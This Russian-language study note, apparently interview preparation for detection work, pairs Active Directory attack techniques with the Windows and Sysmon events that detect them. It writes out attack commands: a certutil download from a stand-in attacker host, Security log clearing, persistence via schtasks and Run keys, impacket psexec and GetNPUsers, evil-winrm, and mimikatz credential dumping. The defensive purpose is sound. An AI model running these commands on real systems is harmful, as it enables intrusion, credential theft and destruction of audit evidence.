### Discovery (помимо BloodHound)

**T1018 — Remote System Discovery**

```
net view /domain
nltest /dclist:corp.local
```

Лог: **4661/4662** редко, чаще просто сетевой NetBIOS/LDAP трафик без явного Windows Event-сигнала — обнаруживается через network detection (Zeek/NetFlow), не через хостовые логи. Почему смотреть сюда: recon-фаза почти всегда предшествует lateral movement, и если её пропустить в логах — не будет контекста для следующего алерта.

**T1082 — System Information Discovery**

```
systeminfo
wmic qfe list
```

Лог: **Sysmon Event 1** (ProcessCreate) — `systeminfo.exe`/`wmic.exe` запущен интерактивным пользователем без соответствующей административной задачи. Само по себе низкой значимости, но в цепочке с другими discovery-командами — сигнал chain reconnaissance.

### Collection

**T1005 — Data from Local System**

```
findstr /si password *.txt *.xml *.ini
```

Лог: **Sysmon 11** (FileCreate) при копировании найденных файлов в staging-директорию, **4663** (Object Access) если аудит файлов включён на конфиденциальных шарах.

**T1039 — Data from Network Shared Drive**  
Лог: **5140** (Network share object accessed) с массовым доступом к разным файлам за короткое время с одной сессии — паттерн automated scraping, отличается от обычного пользовательского доступа частотой.

---

### Command and Control (C2)

**T1071.001 — Application Layer Protocol (Web)**  
Beacon через HTTP/HTTPS (Cobalt Strike, Sliver, Metasploit).  
Лог: **Sysmon 3** (NetworkConnect) — периодичность соединений (jitter beacon pattern) к одному внешнему IP/домену через равные интервалы. На network layer — Zeek `conn.log`, JA3/JA3S fingerprinting TLS handshake.

**T1105 — Ingress Tool Transfer**

```
certutil.exe -urlcache -split -f http://attacker/payload.exe payload.exe
```

Лог: **Sysmon 1** — `certutil.exe` с параметрами `-urlcache`/`-split` — классическая LOLBin-сигнатура, легитимно certutil так не используется практически никогда.

---

### Defense Evasion

**T1070.001 — Clear Windows Event Logs**

```
wevtutil cl Security
```

Лог: **Event 1102** (The audit log was cleared) — сам факт очистки лога это самое надёжное детектирование, потому что если лог очищен, само событие об очистке всё равно записывается в новый пустой лог.

**T1027 — Obfuscated/Encoded Files or Information**  
PowerShell с `-EncodedCommand`.  
Лог: **Sysmon 1** / PowerShell Operational log **4104** (ScriptBlockLogging) — Base64-декодированный блок виден именно в 4104, если Script Block Logging включён (по умолчанию не включён на многих хостах — важный gap, который стоит упомянуть на собеседовании).

---

### Persistence

**T1053.005 — Scheduled Task**

```
schtasks /create /sc onlogon /tn "Update" /tr "C:\payload.exe"
```

Лог: **Security 4698** (A scheduled task was created) — прямое попадание, всегда логируется при создании задачи через API.

**T1547.001 — Registry Run Keys**

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d C:\payload.exe
```

Лог: **Sysmon 13** (RegistryEvent Value Set) на ветке Run/RunOnce — Windows Security log сам по себе это не покрывает без Sysmon.

---

### Lateral Movement (помимо PtH/PtT)

**T1021.002 — SMB/Windows Admin Shares (PsExec)**

```
impacket-psexec corp.local/alex:'123'@192.168.56.109
```

Лог: **Security 7045** (A service was installed) на целевой машине — PsExec создаёт временный service `PSEXESVC`, это самый надёжный индикатор именно этого инструмента, не путать с общим PtH.

**T1021.006 — WinRM**

```
evil-winrm -i 192.168.56.109 -u alex -p '123'
```

Лог: **4624 type 3** с `Logon Process: Negotiate` через порт 5985/5986, WinRM Operational log с деталями сессии.

---

### Exfiltration

**T1041 — Exfiltration Over C2 Channel**  
Лог: та же beacon-периодичность из C2-раздела, но с ростом объёма исходящего трафика (bytes-out) в конкретных временных окнах — смотри NetFlow/Zeek, не Windows Event Log.

**T1567.002 — Exfiltration to Cloud Storage**  
Загрузка через `rclone`/`curl` на внешний облачный сервис.  
Лог: **Sysmon 3** — соединение к известным доменам облачных хранилищ (`*.dropboxapi.com`, `*.googleapis.com`) с нетипичного для этого хоста процесса; на прокси/firewall — DNS-запросы к этим доменам с хостов, где такая активность не ожидается по business-контексту.

## BloodHound 

Инструмент разведки в AD, и дальнейшего анализа с помощью графов для поиска самого быстрого пути для повышения привилегий. использует несколько методов

- Использование самого LDAP протокола для доступа к сервису 4624 -> 4768 ->4769 ldap 
- Использование SMB доступа к  `\\*\IPC$` с целевыми namedpipes `samr` `srvsvc` `lsarpc` не от DC хоста, 4624 -> 4768 -> 4769 -> 5140 ->5145

## Kerberoasting - impacket

Атака которая заключается в получении TGS для для сервиса а после подбор пароля офлайн для учетной записи на которую зарегистрирован сервис, для реализации необходимо иметь аутентифицированную учетную запись, атака осуществима потому что Kerberos не проверяет имеет ли пользователь который запрашивает TGS  доступ к сервису, разрешать или запрещать доступ решает сам сервис, таким образом при слабых паролях мы можем легко подобрать хэш пароля для такой учетной записи, после получения хэша мы можем подобрать его офлайн

## AS-REP Roasting 
Атака направленная на получение AS-REP в котором содержится зашифрованная часть паролем пользователя, зная только имя можем сразу получить хэш пароля который пригоден для офлайн перебора пароля

Теперь для проведения атаки нужно получить аккаунт с отключенной предварительной аутентификацией меняем параметр `userAccountControl` на **4194304** (0x400000) в результате получим аккаунт с отключенной предварительной аутентификацией, так же `bloodhound` по стандарту собирает этот параметр `dontreqpreauth` 

Для проведения атаки используем модуль Imacket: `impacket-GetNPUsers` для поиска учетной записи с отключенной аутентификацией(предположим что разведка невозможна потому что у нас нет учетной записи домена) 

```
┌──(user㉿kali)-[~/bloodhound]
└─$ impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.56.115 -format hashcat -outputfile asrep-hashes.txt

- Стоит обращать внимание на то что предварительная аутентификация 0, тип шифрования 0x17 RC4 либо может быть 0x12 и 0x11 ели пароль слабый это не очень важно,
- Множество таргетов для одного источника, легитимный клиент запросит TGT только для своей учетки
- Источник не соответствует ожидаемому клиенту сервиса - сервисный аккаунт вызывается с конкретного сервера. Запрос с рабочей станции или внешнего IP - несоответствие
- Отсутствие последующей активности сервиса - если TGT для svc аккаунта запрошен но за ним нет 4769 TGS запросов к сервисам, которые этот аккаунт обычно использует, это разрыв паттернов

Легитом можно считать один запрос 4768 с PreAuthType=0 от штатного источника для известного сервисного аккаунта с DONT_REQ_PREAUTH - легаси системы, некоторые Unix/Kerberos клиенты без поддержки Preauth

## LSASS dump
### Mimikatz
Дамп памяти LSASS имеет широкое практическое значение в дальнейшем его можно применить для Pass-The-Hash и Pass-The-Ticket. В результате дампа можно получить:

- NTLM хэши - для Pass-The-hash они хранятся если пользователь аутентифицировался с NTLM или Kerberos
- Возможны пароли в открытом виде если стоит `UseLogonCredential=1`, но можно встретить редко
- Kerberos билеты (TGT/TGS) 
- DPAPI master keys - используются для расшифровки сохраненных паролей в браузерах, RDP креды, wifi
- SSP-креды(Security Support Provider) - если атакующий инжектировал вредоносный SSP (например `mimikatz::misc::memssp`) можно перехватывать plaintext пароли при каждом новом логине на хосте - persistence техника

Практическое применение: прямой запуск на хосте 

```
privilege::debug - включает SeDebugPrivilege в текущем токене процесса
sekurlsa::logonpasswords - парсит память LSASS
sekurlsa::tickets /export - экспортирует все krb из памяти в файлы .kirbi для PtT
```

## DCSync
Атака строится на злоупотреблении протоколом репликации AD. Атакующий имеющий достаточные права, притворяется контроллером домена и запрашивает у настоящего DC репликацию учетных данных через `DRSGetNCChanges` - DC отдает хэши-ключи, потому что реплика между DC - штатная, ожидаемая операция

Требования
- Учетной записи атакующего должны быть делегированы (напрямую или через группу) три права на объекте домена
	- `DS-Replication-Get-Changes` (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
	- `DS-Replication-Get-Changes-All` (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)
	- `DS-Replication-Get-Changes-In-Filtered-Set` (для чтения атрибутов из RODC filtered set, не всегда обязательно)

по умолчанию эти права есть у Domain Admins, Enterprise Admins, Administrators и у самых контроллеров домена. 
В реальности атакующий уже получил DA/эквивалент, либо нашел misconfiguration: делегированные права на репликацию выданы обычному пользователю или сервисному аккаунту

## Shadow Copy
Атака заключается в создании теневой копии тома с `NTDS.dit` и `SAM`+`SYSTEM` потому что иначе обратиться к ним нельзя пока система активна. Volume Shadow Copy Services создает согласованные снапшоты тома а в них файлы уже доступны для чтения. Поэтому цель атаки создать теневую копию или использовать существующую для дампа хэшей уже офлайн

Требования

- Локальный админ/System на DC(или на любом хосте для SAM+SYSTEM - там дампится только локальная база, не AD)

Что копируем и для чего

| файл       | Путь                                  | Содержание                                           |
| ---------- | ------------------------------------- | ---------------------------------------------------- |
| `NTDS.dit` | `C:\Windows\NTDS\NTDS.dit`            | Вся база AD - хэши всех доменных аккаунтов           |
| `SYSTEM`   | `C:\Windows\System32\Config\SYSTEM`   | Boot key (SYSKEY) - нужен для расшифрования NTDS.dit |
| `SAM`      | `C:\Windows\System32\Config\SAM`      | Локальные хэши(на рабочей станции или сервере)       |
| `SECURITY` | `C:\Windows\System32\Config\SECURITY` | LSA секреты - пароли сервисов                        |

Для реализации может использоваться `vssadmin`, `wmic`, `ntdsutil`

```

### Методы детекта ShadowCopy

- Запуск VSS EID 7036/7045, в норме служба запускается при бекапах чаще в ночное время, либо по плановым запускам
- Создание процесса 1/4688 c `vsadmin create shadow`, `wmic shadow copy call create`(так же можно смотреть 5857/5858), `ntdsutil.*ifm` - сами по себе легитимны, но в контексте кто родительский процесс, в какое время и на каком хосте они были активированы
- создание файлов Sysmon 11 - при копировании файлов с помощью VSS регистрирует создание файла 
- Так же следует обратить внимание на удаление теневых копий, что может быть сильным маркером атаки, отключение восстановления windows

## Golden Ticket
При получении хэша пароля от аккаунта krbtgt мы можем самостоятельно подписывать любые TGT с любым содержимым PAC (группы, привилегии, имя пользователя, срок жизни) - KDC примет его как валидный, потому что подпись верная, это все возможно из за того что KDC не хранит историю выданных тикетов

## Potato Family
Суть всех Potato заставить SYSTEM аутентифицироваться к подконтрольному эндпоинту атакующего -> перехватить токен -> выполнить код как SYSTEM

- Исполнение команд от сервисного аккаунта
- Наличие SeImpersonatePrivilege или SeAssignPrimaryTokenPrivelege

## Overpass-The-Hash
Суть атаки заключается в использовании NTLM хеша пользователя для конвертации в реальный TGT через AS-REQ к KDC, вместо прямого использования хэша для NTLM аутентификации. После получения TGT дальнейшая аутентификация идет по Kerberos, что обходит защиты которые направлены на детект NTLM

Для реализации требуется

- NTLM хэши целевого пользователя 
- Локальные права admin/System на хосте, либо сетевой доступ к DC
